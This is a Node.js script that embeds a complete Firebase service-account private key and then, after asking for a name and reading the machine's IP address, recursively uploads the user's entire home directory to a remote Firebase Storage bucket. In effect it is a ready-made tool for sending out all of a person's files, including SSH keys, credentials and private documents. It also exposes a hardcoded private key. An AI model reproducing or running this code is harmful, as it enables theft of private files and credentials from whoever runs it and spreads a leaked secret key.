const admin = require('firebase-admin');
const fs = require('fs');
const path = require('path');
const os = require('os');
const readline = require('readline');
const { networkInterfaces } = require('os');

// Service account key data
const serviceAccount = {
  "type": "service_account",
  "project_id": "test-30b8e",
  "private_key_id": "728bebc66d9343a7bc2d8a6031febfc331b5badf",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDPXCroDtAfjfrL\nOfomkIlBx+iNYLVkgPArj5BIjAHGKVYNf55Z4hxwZxNGrhr8TrelP00QWfgTycaz\ntsGhl2vVV1C4Bhu2MSD+OKlgn2Bh6hHGK3F4ViN7rl4t1pRCSX5g9H0jjZzqvBjs\nFWDl+csgv/2Qvz3731LIMO0BK713C+AFv2NW3eCR4FUeGQm0rlrGumk+Ac5i2NJG\ni4At5/Hg4wd38/3jprRmoaQAWwXhnUz12g3h15/b+tAlKXBhjq16JviLfnzulYF6\n5iEn6rYmVHYIRXLcEXEIw/fdHlPc/LNobzbSn6OpHUimBCbPLW+d/tB2HwYeR/R4\nbU/VbyHLAgMBAAECggEAEXIjMqqgYa9BKketSgD/aKHoPmYkYhl5BhPfje2oQ+L8\nGEmkPygHatY5PclDKvbNJkwuRdG+o0eRff2XypUh9O0833wKvn2MADzbKe5uyP4i\nUwZvrFyu7TvNNP+93IUwv/ksmB5U1T5QaHh0p79S6DqkRkEuIVqiLTFJ7L8ggyXn\nzgItGdIo4fPuFKHVejT6q6fJQuYxf6EFV+2e3/fgZr0F+Fzd9725QGzTUSYTk11p\nPcaYSULmz797tTvXIAjfepORtmQ822+oZMIlJ0Fdppic1rIDnfyW56MNS6mQT+es\niHd5pjKgeAm6MTfE3grEwssyF3mv6fe6Qo+cRn3IIQKBgQDPXcihRWapJxaaswTd\nJ6R3KBWHFNKNztHKOKWp2al3ZpfxRehO9Dt7LudvKwaRNSuTSf18kAG6TgHF5Rs6\n8SxAh1DwHjpLaHjhXKmG+OAH0gA5OJmVCzfqRCFXPj+H9goTT2oij8bfuacjjZ/6\nEkllWNXd1sxLyu2Ro0KOnDySoQKBgQD//gE+8i8ShD9Sn8OLqH7XR2YbpX3iTC2d\nbuWPX8sKIWTEfnmMmKCEJ4cllSugdWVa1v5jWLLBKbwujCBsTtr2J8kmqVT5Poad\nVBuQi/PNwXKLA4YHLwlCmazeOq8JvSWpPtH0rnyO2h5Qekm40HBNdRGRiDRGmE0D\nA4JD1I+I6wKBgHi6BhN2P0WdvzhDn0JOUR8aVCY3xjnPPi54emJ/mX0tWqqaY5yL\n7pFSBmWfbAxgI0V2H0FE6eyYe8nGD+tp+7R503JodtHuOeois4QkIvIKnhyySiAO\nzvfxwGN1lzFF2inR413JzSP1h0xYqNnDib2aUbD83CYIN/XBUf+LEGzhAoGBAP8k\nA8vgB+iVpKNOFtDQTDN2tx9g7zmoIWKjD+u5Vx2usMdjIvRtfraYyws7RPM1bqJ+\nW6da1TbOyP8/rGUmpvfmKYb+CHIuzm5qUNrdkk6FuwswpNnuGHWnwvLvXFwBiFLK\nCOqtKfobDVG6wFWScgvRXYRGU4v06fTR/3hpl/GnAoGABhkgNoivzjoWdrSH7uBt\nrd3XvqzOj9Ye+SKsge19Yo3cWM8X4ut5Fl5ofI3DyGup39w9DfgZi14oaTfphWsq\nOs2/ddBpgflQR00Neend7Vzi5dq4C6bm20xBfJ0rw7zmtoODSv3NucZV5IbSVNQT\nZzn4RCQC7x9OfiDEvNc1/Jw=\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-dwzul@test-30b8e.iam.gserviceaccount.com",
  "client_id": "111604298940034474537",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-dwzul%40test-30b8e.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
};

// Initialize Firebase Admin SDK
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  storageBucket: 'test-30b8e.appspot.com'
});
const bucket = admin.storage().bucket();

// Function to upload a file
const uploadFile = (filePath, relativePath) => {
  return bucket.upload(filePath, {
    destination: relativePath
  });
};

// Function to upload a directory
const uploadDirectory = async (dirPath, parentPath = '') => {
  const files = fs.readdirSync(dirPath);
  for (const file of files) {
    const filePath = path.join(dirPath, file);
    const stat = fs.statSync(filePath);
    const relativePath = path.join(parentPath, file);
    if (stat.isFile()) {
      console.log(`Uploading: ${filePath}`);
      await uploadFile(filePath, relativePath);
    } else if (stat.isDirectory()) {
      console.log(`Entering directory: ${filePath}`);
      await uploadDirectory(filePath, relativePath);
    }
  }
};

// Get local IP
const getIPAddress = () => {
  const nets = networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === 'IPv4' && !net.internal) {
        return net.address;
      }
    }
  }
  return 'unknown-ip';
};

// Prompt user for name
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('Enter your name: ', (name) => {
  const ipAddress = getIPAddress();
  const folderName = `${name}_${ipAddress}`;
  const directoryToUpload = os.homedir(); // Set to $HOME directory
  console.log(`Uploading data from ${directoryToUpload} to folder: ${folderName}`);
  uploadDirectory(directoryToUpload, folderName)
    .then(() => {
      console.log('All files uploaded successfully.');
      rl.close();
    })
    .catch((error) => {
      console.error('Error uploading files:', error);
      rl.close();
    });
});

